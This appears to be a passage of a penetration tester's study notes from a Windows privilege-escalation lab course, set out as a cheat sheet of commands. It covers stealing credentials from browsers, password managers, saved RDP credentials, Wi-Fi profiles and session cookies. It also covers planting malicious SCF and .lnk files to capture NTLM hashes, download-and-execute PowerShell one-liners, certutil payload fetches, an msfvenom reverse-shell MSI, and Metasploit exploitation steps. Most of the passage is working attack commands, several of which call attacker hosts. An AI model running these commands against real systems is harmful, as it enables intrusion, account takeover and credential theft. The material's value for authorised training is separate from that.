File Location: `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`

#### Viewing Sticky Notes Data Using PowerShell
```PowerShell
Set-ExecutionPolicy Bypass -Scope Process
```

```PowerShell
cd .\PSSQLite\
```

```PowerShell
Import-Module .\PSSQLite.psd1
```

```PowerShell
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
```

```PowerShell
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

#### Strings to View DB File Contents
```Shell
strings plum.sqlite-wal
```

#### Other Interesting Files
```Shell
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

### Cmdkey Saved Credentials

#### Listing Saved Credentials
```cmd.exe
cmdkey /list
```
When we attempt to RDP to the host (mstsc.exe), the saved credentials will be used.

#### Run Commands as Another User
```PowerShell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```
We can also attempt to reuse the credentials using` runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console.

### Browser Credentials

#### Retrieving Saved Credentials from Chrome
```PowerShell
.\SharpChrome.exe logins /unprotect
```

### Password Managers

Download a .kdbx file to the attacking host and use `keepass2john` to extract the credentials.

#### Extracting KeePass Hash
```Shell
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
```

#### Cracking Hash Offline
```cmd.exe
hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
Feed the hash to Hashcat, specifying hash mode 13400 for KeePass

### Email
search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool `MailSniper`

### Lazagne

#### Running All LaZagne Modules
```PowerShell
.\lazagne.exe all
```

### SessionGopher

#### Running SessionGopher as Current User
Local admin access to retrieve stored session information for every user in `HKEY_USERS`, but it is always worth running as our current user to see if we can find any useful credentials.
```PowerShell
.\SessionGopher.ps1
```

```PowerShell
Invoke-SessionGopher -Target WINLPE-SRV01
```

### Wifi Passwords

#### Viewing Saved Wireless Networks
Requires local admin access to a user's workstation with a wireless card.
```cmd.exe
netsh wlan show profile
```

#### Retrieving Saved Wireless Passwords
```cmd.exe
netsh wlan show profile ilfreight_corp key=clear
```

## Interacting with Users

A great technique is placing malicious files around heavily accessed file shares in an attempt to retrieve user password hashes to crack offline later.

### Traffic Capture
Using `Wireshark`, `tcpdump`, or `net-creds.py`

### Process Command Lines

#### Running Monitor Script on Target Host
```PowerShell
IEX (iwr 'http//10.10.10.205/procmon.ps1')
```

### SCF on a File Share
If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share.

#### Malicious SCF File
```cmd.exe
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
 Name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). Put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. 

#### Starting Responder
```Shell
sudo responder -v -I tun0
```

#### Cracking NTLMv2 Hash with Hashcat
```cmd.exe
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

### Capturing Hashes with a Malicious .lnk File
No longer works on Server 2019 hosts, but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file.

#### Generating a Malicious .lnk File w/ PowerShell
```Powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```


## Pillaging

### Installed Applications

#### Identifying Common Applications
```cmd.exe
dir "C:\Program Files"
```

#### Get Installed Programs via PowerShell & Registry Keys
```PowerShell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
```

```PowerShell
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
```

```PowerShell
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```
Program of interest in example: `mRemoteNG`

#### Discover mRemoteNG Configuration Files
```PowerShell
ls C:\Users\julio\AppData\Roaming\mRemoteNG
```
By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.  `mRemoteNG` saves connection info and credentials to a file called `confCons.xml`

#### Decrypt the Password with mremoteng_decrypt
```Shell
mRemoteNG-Decrypt.py -s "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ="
```
If there's a master password and we know it, we can then use the option `-p` with the custom master password to also decrypt the password.

#### Decrypt the Password with mremoteng_decrypt and a Custom Password
```Shell
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
```

#### For Loop to Crack the Master Password with mremoteng_decrypt


```Shell
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done
```

### Abusing Cookies to Get Access to IM Clients
If the user is using any form of multi-factor authentication, or we can't get the user's plaintext credentials, we can try to steal the user's cookies to log in to the cloud-based client.

#### Cookie Extraction from Firefox
Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each `user's APPDATA directory %APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. 

#### Copy Firefox Cookies Database
```PowerShell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.

#### Extract Slack Cookie from Firefox Cookies Database
```Shell
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```
Use any browser extension to add the cookie to our browser. e.g., Firefox and the extension . 
![[cookie-editor.png]]
Once you have saved the cookie, you can refresh the page and see that you are logged in as the user. We may get a prompt for credentials or other types of authentication information; we can repeat the above process and replace the cookie `d` with the same value we used to gain access the first time on any website that asks us for information or credentials.

Once we complete this process for every website where we get a prompt, we need to refresh the browser, click on` Launch Slack` and use Slack in the browser. 

Make sure you save the cookie by clicking the `save` icon.

#### Cookie Extraction from Chromium-based Browsers

#### PowerShell Script - Invoke-SharpChromium
```PowerShell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
```

```PowerShell
Invoke-SharpChromium -Command "cookies slack.com"
```
We can modify the code of `SharpChromium` or copy the cookie file to where `SharpChromium` is looking.

#### Copy Cookies to SharpChromium Expected Location
```PowerShell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

#### Invoke-SharpChromium Cookies Extraction
```PowerShell
Invoke-SharpChromium -Command "cookies slack.com"
```
We can now use this cookie with cookie-editor as we did with Firefox.

*Note: When copy/pasting the contents of a cookie, make sure the value is one line.*

### Clipboard

#### Monitor the Clipboard with PowerShell
```PowerShell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
```

```PowerShell
Invoke-ClipboardLogger
```
The script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.

*Note: User credentials can be obtained with tools such as Mimikatz or a keylogger. C2 Frameworks such as Metasploit contain built-in functions for keylogging.*

### Roles and Services

#### Attacking Backup Servers
If we compromise a server or host with a backup system, we can compromise the network.

#### restic - Initialize Backup Directory
```PowerShell
mkdir E:\restic2; restic.exe -r E:\restic2 init
```

#### restic - Back up a Directory
```PowerShell
$env:RESTIC_PASSWORD = 'Password'
```

```PowerShell
restic.exe -r E:\restic2\ backup C:\SampleFolder
```

If we want to back up a directory such as `C:\Windows`, which has some files actively used by the operating system, we can use the option `--use-fs-snapshot` to create a VSS (Volume Shadow Copy) to perform the backup.

#### restic - Back up a Directory with VSS
```PowerShell
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```

*Note: If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.*

#### restic - Check Backups Saved in a Repository
```PowerShell
restic.exe -r E:\restic2\ snapshots
```
If we navigate to `C:\Restore`, we will find the directory structure where the backup was taken. To get to the `SampleFolder` directory, we need to navigate to `C:\Restore\C\SampleFolder`.

#### restic - Restore a Backup with ID
```PowerShell
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```

***Lab note: After restoring backup for Windows/System32/config, I moved the SAM, SYSTEM, and SECURITY files to the attack host over SMB and used `secretsdump.py` to obtain the Administrator's hashes*

## Miscellaneous Techniques

### Living Off The Land Binaries and Scripts (LOLBAS)

 [LOLBAS project](https://lolbas-project.github.io/)

#### Transferring File with Certutil
```PowerShell
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

#### Encoding File with Certutil
```cmd.exe
certutil -encode file1 encodedfile
```

#### Decoding File with Certutil
```cmd.exe
certutil -decode encodedfile file2
```

A binary such as rundll32.exe can be used to execute a DLL file. We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.

### Always Install Elevated
Can be set via Local Group Policy by setting Always install with elevated privileges to Enabled under the following paths:
- `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
- `User Configuration\Administrative Templates\Windows Components\Windows Installer`

#### Enumerating Always Install Elevated Settings
```PowerShell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

```cmd.exe
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

#### Generating MSI Package
We can exploit this by generating a malicious `MSI` package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.
```Shell
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

#### Executing MSI Package
```cmd.exe
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```
Upload the MSI file to the target, start a Netcat listener on the attacking machine and execute the file

#### Catching Shell
```Shell
nc -lnvp 9443
```

### CVE-2019-1388

First right click on the `hhupd.exe` executable and select `Run as administrator` from the menu
![[Pasted image 20230110165520.png]]

Click on Show information about the publisher's certificate to open the certificate dialog. Here we can see that the `SpcSpAgencyInfo` field is populated in the` Details` tab.
![[Pasted image 20230110165629.png]]

Go back to the General tab and see that the `Issued by` field is populated with a hyperlink. Click on it and then click `OK`, and the certificate dialog will close, and a browser window will launch.
![[Pasted image 20230110165717.png]]

If we open Task Manager, we will see that the browser instance was launched as SYSTEM.
![[Pasted image 20230110165810.png]]

Next, we can right-click anywhere on the web page and choose `View page source`. Once the page source opens in another tab, right-click again and select `Save as`, and a `Save As` dialog box will open.
![[Pasted image 20230110165844.png]]

We can launch any program we would like as `SYSTEM`. Type `c:\windows\system32\cmd.exe` in the file path and hit `enter`. If all goes to plan, we will have a `cmd.exe` instance running as `SYSTEM`.
![[Pasted image 20230110165955.png]]

This [link](https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a) lists all of the vulnerable Windows Server and Workstation versions.

### Scheduled Tasks

#### Enumerating Scheduled Tasks
```cmd.exe
schtasks /query /fo LIST /v
```

#### Enumerating Scheduled Tasks w/ PowerShell
```PowerShell
Get-ScheduledTask | select TaskName,State
```

#### Checking Permissions on `C:\Scripts` Directory
```cmd.exe
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```
Look for scripts in the directory that are writable by the `BUILTIN\USERS` group. Write a command to send a beacon back to our C2 infrastructure and carry on with testing.

### User/Computer Description Field

#### Checking Local User Description Field
```PowerShell
Get-LocalUser
```

#### Enumerating Computer Description Field with `Get-WmiObject` Cmdlet
```PowerShell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

### Mount VHDX/VMDK
[Snaffler](https://github.com/SnaffCon/Snaffler) can assist with uncovering `.vhd`, `.vhdx`, and `.vmdk` files. If we encounter any of these three files, we have options to mount them on either our local Linux or Windows attack boxes.

Mount a share from our Linux attack box or copy over one of these files

#### Mount VMDK on Linux
```Shell
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

#### Mount VHD/VHDX on Linux
```Shell
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

In Windows, we can right-click on the file and choose `Mount`, or use the `Disk Management` utility to mount a` .vhd` or `.vhdx` file.
![[Pasted image 20230110171926.png]]

For a `.vmdk` file, we can right-click and choose `Map Virtual Disk` from the menu. If all goes to plan, we can browse the target operating system's files and directories. If this fails, we can use `VMWare Workstation File --> Map Virtual Disks` to map the disk onto our base system. 

#### Retrieving Hashes using Secretsdump.py
```Shell
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```


## Windows Server

#### Querying Current Patch Level
```cmd.exe
wmic qfe
```

#### Running Sherlock
```PowerShell
Set-ExecutionPolicy bypass -Scope process
```

```PowerShell
Import-Module .\Sherlock.ps1
```

```PowerShell
Find-AllVulns
```

#### Obtaining a Meterpreter Shell
```Shell
use exploit/windows/smb/smb_delivery
set target 0
exploit
```
*Target 0 is `DLL`*

#### Rundll Command on Target Host
```cmd.exe
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

This will provide a reverse shell on meterpreter

#### Searching for Local Privilege Escalation Exploit
```Shell
search 2010-3338
use 0
```

#### Migrating to a 64-bit Process
```Shell
sessions -i 1
getpid
ps
migrate 2796
background
```
Migrate to whichever PID `conhost.exe` is running on (or another x64 process you have rights to)

#### Setting Privilege Escalation Module Options
```Shell
set SESSION 1
set lhost <your ip>
set lport 4443
exploit
```
Use cmd `getuid` to ensure you received a privileged shell

## Windows Desktop Versions

### Windows 7 Case Study
[Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

#### Install Python Dependencies
```Shell
wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
```

```Shell
tar -xf setuptools-2.0.tar.gz
```

```Shell
cd setuptools-2.0/
```

```Shell
python2.7 setup.py install
```

```Shell
wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
```

```Shell
tar -xf xlrd-1.0.0.tar.gz
```

```Shell
cd xlrd-1.0.0/
```

```Shell
python2.7 setup.py install
```

#### Gathering Systeminfo Command Output
```cmd.exe
systeminfo
```
Capture the `systeminfo` command's output and save it to a text file on our attack VM

#### Updating the Local Microsoft Vulnerability Database
```Shell
python2.7 windows-exploit-suggester.py --update
```
Saves the contents to a local Excel file

#### Running Windows Exploit Suggester
```Shell
python2.7 windows-exploit-suggester.py  --database 2023-01-11-mssb.xls --systeminfo win7lpe-systeminfo.txt 
```

*NOTE: For the lab, and for my Kali distro, it was necessary to use the [Python3 version](https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py) with the following command:*

```Shell
python windows-exploit-suggester.py  --database 2023-01-11-mssb.xls --systeminfo sysinfo.txt 
```


#### If Meterpreter shell has been obtained
```Shell
run post/multi/recon/local_exploit_suggester
```
This will help us quickly find any potential privilege escalation vectors and run them within Metasploit should any module exist.

#### Exploiting MS16-032 with [PowerShell PoC](https://www.exploit-db.com/exploits/39719)
```PowerShell
Set-ExecutionPolicy bypass -scope process
```

```PowerShell
Import-Module .\Invoke-MS16-032.ps1
```

```PowerShell
Invoke-MS16-032
```

#### Spawning a SYSTEM Console
```cmd.exe
whoami
```

### Enabling RDP
#### Enable Remote Desktop
```PowerShell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
```
#### Start Remote Desktop Services 
```PowerShell
Start-Service -Name TermService -ErrorAction SilentlyContinue
```
#### Create Firewall rule allowing inbound traffic over port 3389
```PowerShell
New-NetFirewallRule -Name "Allow RDP" -DisplayName "Allow RDP" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 3389
```

or:
```cmd
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
#### Searching a directory for alternative data streams
```cmd.exe
dir /R
```
#### Read the stream by piping into it
```cmd.exe
more < hm.txt:root.txt
```

### Creating and executing a Scheduled Task (w/ CS Beacon)
Especially useful for when you have limited privileges on a LOCAL SERVICE account and want to get more privileges
#### Create a scheduled task action to execute PowerShell 
```PowerShell
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -Command `"& 'C:\wamp\www\common-apps.exe'`"" 
```
#### Register the scheduled task with the action 
```PowerShell
Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm" 
```
#### Start the scheduled task ```
```PowerShell
Start-ScheduledTask -TaskName "GrantPerm"
```